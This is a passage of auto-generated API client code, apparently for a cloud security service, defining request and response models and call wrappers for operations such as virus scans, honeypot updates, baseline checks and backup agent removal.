    query['CheckGroupId'] = request.checkGroupId;
  }
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RemoveCheckResultWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function removeCheckResultWhiteList(request: RemoveCheckResultWhiteListRequest): RemoveCheckResultWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return removeCheckResultWhiteListWithOptions(request, runtime);
}

model RollbackSuspEventQuaraFileRequest {
  from?: string(name='From'),
  quaraFileId?: int32(name='QuaraFileId'),
  sourceIp?: string(name='SourceIp'),
}

model RollbackSuspEventQuaraFileResponseBody = {
  requestId?: string(name='RequestId'),
}

model RollbackSuspEventQuaraFileResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RollbackSuspEventQuaraFileResponseBody(name='body'),
}

async function rollbackSuspEventQuaraFileWithOptions(request: RollbackSuspEventQuaraFileRequest, runtime: Util.RuntimeOptions): RollbackSuspEventQuaraFileResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.quaraFileId)) {
    query['QuaraFileId'] = request.quaraFileId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RollbackSuspEventQuaraFile',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function rollbackSuspEventQuaraFile(request: RollbackSuspEventQuaraFileRequest): RollbackSuspEventQuaraFileResponse {
  var runtime = new Util.RuntimeOptions{};
  return rollbackSuspEventQuaraFileWithOptions(request, runtime);
}

model SasInstallCodeRequest {
  sourceIp?: string(name='SourceIp'),
}

model SasInstallCodeResponseBody = {
  requestId?: string(name='RequestId'),
  data?: string(name='data'),
}

model SasInstallCodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SasInstallCodeResponseBody(name='body'),
}

async function sasInstallCodeWithOptions(request: SasInstallCodeRequest, runtime: Util.RuntimeOptions): SasInstallCodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SasInstallCode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function sasInstallCode(request: SasInstallCodeRequest): SasInstallCodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return sasInstallCodeWithOptions(request, runtime);
}

model SaveImageBaselineStrategyRequest {
  baselineItemList?: string(name='BaselineItemList'),
  lang?: string(name='Lang'),
  strategyId?: long(name='StrategyId'),
  strategyName?: string(name='StrategyName'),
}

model SaveImageBaselineStrategyResponseBody = {
  requestId?: string(name='RequestId'),
}

model SaveImageBaselineStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SaveImageBaselineStrategyResponseBody(name='body'),
}

async function saveImageBaselineStrategyWithOptions(request: SaveImageBaselineStrategyRequest, runtime: Util.RuntimeOptions): SaveImageBaselineStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineItemList)) {
    query['BaselineItemList'] = request.baselineItemList;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.strategyName)) {
    query['StrategyName'] = request.strategyName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SaveImageBaselineStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function saveImageBaselineStrategy(request: SaveImageBaselineStrategyRequest): SaveImageBaselineStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return saveImageBaselineStrategyWithOptions(request, runtime);
}

model SaveSuspEventUserSettingRequest {
  from?: string(name='From'),
  levelsOn?: string(name='LevelsOn'),
}

model SaveSuspEventUserSettingResponseBody = {
  code?: string(name='Code'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model SaveSuspEventUserSettingResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SaveSuspEventUserSettingResponseBody(name='body'),
}

async function saveSuspEventUserSettingWithOptions(request: SaveSuspEventUserSettingRequest, runtime: Util.RuntimeOptions): SaveSuspEventUserSettingResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.levelsOn)) {
    query['LevelsOn'] = request.levelsOn;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SaveSuspEventUserSetting',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function saveSuspEventUserSetting(request: SaveSuspEventUserSettingRequest): SaveSuspEventUserSettingResponse {
  var runtime = new Util.RuntimeOptions{};
  return saveSuspEventUserSettingWithOptions(request, runtime);
}

model SetClusterInterceptionConfigRequest {
  clusterIds?: string(name='ClusterIds'),
  switchOn?: int32(name='SwitchOn'),
  switchType?: int32(name='SwitchType'),
}

model SetClusterInterceptionConfigResponseBody = {
  requestId?: string(name='RequestId'),
  result?: boolean(name='Result'),
}

model SetClusterInterceptionConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SetClusterInterceptionConfigResponseBody(name='body'),
}

async function setClusterInterceptionConfigWithOptions(request: SetClusterInterceptionConfigRequest, runtime: Util.RuntimeOptions): SetClusterInterceptionConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterIds)) {
    query['ClusterIds'] = request.clusterIds;
  }
  if (!Util.isUnset(request.switchOn)) {
    query['SwitchOn'] = request.switchOn;
  }
  if (!Util.isUnset(request.switchType)) {
    query['SwitchType'] = request.switchType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SetClusterInterceptionConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function setClusterInterceptionConfig(request: SetClusterInterceptionConfigRequest): SetClusterInterceptionConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return setClusterInterceptionConfigWithOptions(request, runtime);
}

model SetRegistryScanDayNumRequest {
  scanDayNum?: int32(name='ScanDayNum'),
}

model SetRegistryScanDayNumResponseBody = {
  requestId?: string(name='RequestId'),
}

model SetRegistryScanDayNumResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SetRegistryScanDayNumResponseBody(name='body'),
}

async function setRegistryScanDayNumWithOptions(request: SetRegistryScanDayNumRequest, runtime: Util.RuntimeOptions): SetRegistryScanDayNumResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.scanDayNum)) {
    query['ScanDayNum'] = request.scanDayNum;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SetRegistryScanDayNum',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function setRegistryScanDayNum(request: SetRegistryScanDayNumRequest): SetRegistryScanDayNumResponse {
  var runtime = new Util.RuntimeOptions{};
  return setRegistryScanDayNumWithOptions(request, runtime);
}

model StartBaselineSecurityCheckRequest {
  itemIds?: [ long ](name='ItemIds'),
  lang?: string(name='Lang'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
  type?: string(name='Type'),
}

model StartBaselineSecurityCheckResponseBody = {
  requestId?: string(name='RequestId'),
}

model StartBaselineSecurityCheckResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: StartBaselineSecurityCheckResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request StartBaselineSecurityCheckRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return StartBaselineSecurityCheckResponse
 */
// Deprecated
async function startBaselineSecurityCheckWithOptions(request: StartBaselineSecurityCheckRequest, runtime: Util.RuntimeOptions): StartBaselineSecurityCheckResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.itemIds)) {
    query['ItemIds'] = request.itemIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'StartBaselineSecurityCheck',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request StartBaselineSecurityCheckRequest
  * @return StartBaselineSecurityCheckResponse
 */
// Deprecated
async function startBaselineSecurityCheck(request: StartBaselineSecurityCheckRequest): StartBaselineSecurityCheckResponse {
  var runtime = new Util.RuntimeOptions{};
  return startBaselineSecurityCheckWithOptions(request, runtime);
}

model StartDiscoverDatabaseTaskResponseBody = {
  createMark?: string(name='CreateMark'),
  requestId?: string(name='RequestId'),
}

model StartDiscoverDatabaseTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: StartDiscoverDatabaseTaskResponseBody(name='body'),
}

async function startDiscoverDatabaseTaskWithOptions(runtime: Util.RuntimeOptions): StartDiscoverDatabaseTaskResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'StartDiscoverDatabaseTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function startDiscoverDatabaseTask(): StartDiscoverDatabaseTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return startDiscoverDatabaseTaskWithOptions(runtime);
}

model StartPreCheckDatabaseRequest {
  databaseType?: string(name='DatabaseType'),
  instanceUuid?: string(name='InstanceUuid'),
  uniRegionId?: string(name='UniRegionId'),
}

model StartPreCheckDatabaseResponseBody = {
  createMark?: string(name='CreateMark'),
  requestId?: string(name='RequestId'),
}

model StartPreCheckDatabaseResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: StartPreCheckDatabaseResponseBody(name='body'),
}

async function startPreCheckDatabaseWithOptions(request: StartPreCheckDatabaseRequest, runtime: Util.RuntimeOptions): StartPreCheckDatabaseResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.databaseType)) {
    query['DatabaseType'] = request.databaseType;
  }
  if (!Util.isUnset(request.instanceUuid)) {
    query['InstanceUuid'] = request.instanceUuid;
  }
  if (!Util.isUnset(request.uniRegionId)) {
    query['UniRegionId'] = request.uniRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'StartPreCheckDatabase',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function startPreCheckDatabase(request: StartPreCheckDatabaseRequest): StartPreCheckDatabaseResponse {
  var runtime = new Util.RuntimeOptions{};
  return startPreCheckDatabaseWithOptions(request, runtime);
}

model StartVirusScanTaskRequest {
  targetInfo?: string(name='TargetInfo'),
}

model StartVirusScanTaskResponseBody = {
  requestId?: string(name='RequestId'),
  scanTaskId?: long(name='ScanTaskId'),
}

model StartVirusScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: StartVirusScanTaskResponseBody(name='body'),
}

async function startVirusScanTaskWithOptions(request: StartVirusScanTaskRequest, runtime: Util.RuntimeOptions): StartVirusScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.targetInfo)) {
    query['TargetInfo'] = request.targetInfo;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'StartVirusScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function startVirusScanTask(request: StartVirusScanTaskRequest): StartVirusScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return startVirusScanTaskWithOptions(request, runtime);
}

model SubmitCheckResponseBody = {
  data?: {
    operateCode?: string(name='OperateCode'),
  }(name='Data'),
  requestId?: string(name='RequestId'),
  taskId?: string(name='TaskId'),
}

model SubmitCheckResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SubmitCheckResponseBody(name='body'),
}

async function submitCheckWithOptions(runtime: Util.RuntimeOptions): SubmitCheckResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'SubmitCheck',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function submitCheck(): SubmitCheckResponse {
  var runtime = new Util.RuntimeOptions{};
  return submitCheckWithOptions(runtime);
}

model UnbindAegisRequest {
  uuids?: string(name='Uuids'),
}

model UnbindAegisResponseBody = {
  requestId?: string(name='RequestId'),
}

model UnbindAegisResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UnbindAegisResponseBody(name='body'),
}

async function unbindAegisWithOptions(request: UnbindAegisRequest, runtime: Util.RuntimeOptions): UnbindAegisResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UnbindAegis',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function unbindAegis(request: UnbindAegisRequest): UnbindAegisResponse {
  var runtime = new Util.RuntimeOptions{};
  return unbindAegisWithOptions(request, runtime);
}

model UninstallBackupClientRequest {
  policyVersion?: string(name='PolicyVersion'),
  uuid?: string(name='Uuid'),
  uuidList?: [ string ](name='UuidList'),
}

model UninstallBackupClientResponseBody = {
  requestId?: string(name='RequestId'),
}

model UninstallBackupClientResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UninstallBackupClientResponseBody(name='body'),
}

async function uninstallBackupClientWithOptions(request: UninstallBackupClientRequest, runtime: Util.RuntimeOptions): UninstallBackupClientResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UninstallBackupClient',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function uninstallBackupClient(request: UninstallBackupClientRequest): UninstallBackupClientResponse {
  var runtime = new Util.RuntimeOptions{};
  return uninstallBackupClientWithOptions(request, runtime);
}

model UninstallUniBackupAgentRequest {
  policyId?: long(name='PolicyId'),
}

model UninstallUniBackupAgentResponseBody = {
  requestId?: string(name='RequestId'),
}

model UninstallUniBackupAgentResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UninstallUniBackupAgentResponseBody(name='body'),
}

async function uninstallUniBackupAgentWithOptions(request: UninstallUniBackupAgentRequest, runtime: Util.RuntimeOptions): UninstallUniBackupAgentResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UninstallUniBackupAgent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function uninstallUniBackupAgent(request: UninstallUniBackupAgentRequest): UninstallUniBackupAgentResponse {
  var runtime = new Util.RuntimeOptions{};
  return uninstallUniBackupAgentWithOptions(request, runtime);
}

model UpdateHoneypotRequest {
  honeypotId?: string(name='HoneypotId'),
  honeypotName?: string(name='HoneypotName'),
  meta?: string(name='Meta'),
}

model UpdateHoneypotResponseBody = {
  code?: string(name='Code'),
  data?: {
    honeypotId?: string(name='HoneypotId'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName'),
    honeypotImageName?: string(name='HoneypotImageName'),
    honeypotName?: string(name='HoneypotName'),
    nodeId?: string(name='NodeId'),
    presetId?: string(name='PresetId'),
    state?: [ string ](name='State'),
  }(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model UpdateHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateHoneypotResponseBody(name='body'),
}

async function updateHoneypotWithOptions(request: UpdateHoneypotRequest, runtime: Util.RuntimeOptions): UpdateHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotId)) {
    query['HoneypotId'] = request.honeypotId;
  }
  if (!Util.isUnset(request.honeypotName)) {
    query['HoneypotName'] = request.honeypotName;
  }
  if (!Util.isUnset(request.meta)) {
    query['Meta'] = request.meta;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function updateHoneypot(request: UpdateHoneypotRequest): UpdateHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateHoneypotWithOptions(request, runtime);
}

model UpdateHoneypotNodeRequest {
  availableProbeNum?: int32(name='AvailableProbeNum'),
  nodeId?: string(name='NodeId'),
  nodeName?: string(name='NodeName'),
  securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList'),
}

model UpdateHoneypotNodeResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model UpdateHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateHoneypotNodeResponseBody(name='body'),
}

async function updateHoneypotNodeWithOptions(request: UpdateHoneypotNodeRequest, runtime: Util.RuntimeOptions): UpdateHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.availableProbeNum)) {
    query['AvailableProbeNum'] = request.availableProbeNum;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.securityGroupProbeIpList)) {
    query['SecurityGroupProbeIpList'] = request.securityGroupProbeIpList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function updateHoneypotNode(request: UpdateHoneypotNodeRequest): UpdateHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateHoneypotNodeWithOptions(request, runtime);
}

model UpdateHoneypotPresetRequest {
  honeypotImageName?: string(name='HoneypotImageName'),
  honeypotPresetId?: string(name='HoneypotPresetId'),
  meta?: string(name='Meta'),
  presetName?: string(name='PresetName'),
}

model UpdateHoneypotPresetResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model UpdateHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateHoneypotPresetResponseBody(name='body'),
}

async function updateHoneypotPresetWithOptions(request: UpdateHoneypotPresetRequest, runtime: Util.RuntimeOptions): UpdateHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotImageName)) {
    query['HoneypotImageName'] = request.honeypotImageName;
  }
  if (!Util.isUnset(request.honeypotPresetId)) {
    query['HoneypotPresetId'] = request.honeypotPresetId;
  }
  if (!Util.isUnset(request.meta)) {
    query['Meta'] = request.meta;
  }
  if (!Util.isUnset(request.presetName)) {
    query['PresetName'] = request.presetName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function updateHoneypotPreset(request: UpdateHoneypotPresetRequest): UpdateHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateHoneypotPresetWithOptions(request, runtime);
}

model UpdateHoneypotProbeRequest {
  arp?: boolean(name='Arp'),
  displayName?: string(name='DisplayName'),
  ping?: boolean(name='Ping'),
  probeId?: string(name='ProbeId'),
  serviceIpList?: [ string ](name='ServiceIpList'),
}

model UpdateHoneypotProbeResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model UpdateHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateHoneypotProbeResponseBody(name='body'),
}

async function updateHoneypotProbeWithOptions(request: UpdateHoneypotProbeRequest, runtime: Util.RuntimeOptions): UpdateHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.arp)) {
    query['Arp'] = request.arp;
  }
  if (!Util.isUnset(request.displayName)) {
    query['DisplayName'] = request.displayName;
  }
  if (!Util.isUnset(request.ping)) {
    query['Ping'] = request.ping;
  }
  if (!Util.isUnset(request.probeId)) {
    query['ProbeId'] = request.probeId;
  }
  if (!Util.isUnset(request.serviceIpList)) {
    query['ServiceIpList'] = request.serviceIpList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function updateHoneypotProbe(request: UpdateHoneypotProbeRequest): UpdateHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateHoneypotProbeWithOptions(request, runtime);
}

model UpdateJenkinsImageRegistryNameRequest {
  registryId?: long(name='RegistryId'),
  registryName?: string(name='RegistryName'),
  sourceIp?: string(name='SourceIp'),
}

model UpdateJenkinsImageRegistryNameResponseBody = {
  data?: boolean(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  requestId?: string(name='RequestId'),
  timeCost?: long(name='TimeCost'),
}

model UpdateJenkinsImageRegistryNameResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateJenkinsImageRegistryNameResponseBody(name='body'),
}

async function updateJenkinsImageRegistryNameWithOptions(request: UpdateJenkinsImageRegistryNameRequest, runtime: Util.RuntimeOptions): UpdateJenkinsImageRegistryNameResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.registryId)) {
    body['RegistryId'] = request.registryId;
  }
  if (!Util.isUnset(request.registryName)) {
    body['RegistryName'] = request.registryName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'UpdateJenkinsImageRegistryName',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function updateJenkinsImageRegistryName(request: UpdateJenkinsImageRegistryNameRequest): UpdateJenkinsImageRegistryNameResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateJenkinsImageRegistryNameWithOptions(request, runtime);
}

model UpdateJenkinsImageRegistryPersistenceDayRequest {
  persistenceDay?: int32(name='PersistenceDay'),
  registryId?: long(name='RegistryId'),
  sourceIp?: string(name='SourceIp'),
}

model UpdateJenkinsImageRegistryPersistenceDayResponseBody = {
  data?: boolean(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  requestId?: string(name='RequestId'),
  timeCost?: long(name='TimeCost'),
}

model UpdateJenkinsImageRegistryPersistenceDayResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateJenkinsImageRegistryPersistenceDayResponseBody(name='body'),
}

async function updateJenkinsImageRegistryPersistenceDayWithOptions(request: UpdateJenkinsImageRegistryPersistenceDayRequest, runtime: Util.RuntimeOptions): UpdateJenkinsImageRegistryPersistenceDayResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.persistenceDay)) {
    body['PersistenceDay'] = request.persistenceDay;
  }
  if (!Util.isUnset(request.registryId)) {
    body['RegistryId'] = request.registryId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'UpdateJenkinsImageRegistryPersistenceDay',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function updateJenkinsImageRegistryPersistenceDay(request: UpdateJenkinsImageRegistryPersistenceDayRequest): UpdateJenkinsImageRegistryPersistenceDayResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateJenkinsImageRegistryPersistenceDayWithOptions(request, runtime);
}

model UpgradeBackupPolicyVersionRequest {
  id?: long(name='Id'),
}

model UpgradeBackupPolicyVersionResponseBody = {
  requestId?: string(name='RequestId'),
}

model UpgradeBackupPolicyVersionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpgradeBackupPolicyVersionResponseBody(name='body'),
}

async function upgradeBackupPolicyVersionWithOptions(request: UpgradeBackupPolicyVersionRequest, runtime: Util.RuntimeOptions): UpgradeBackupPolicyVersionResponse {
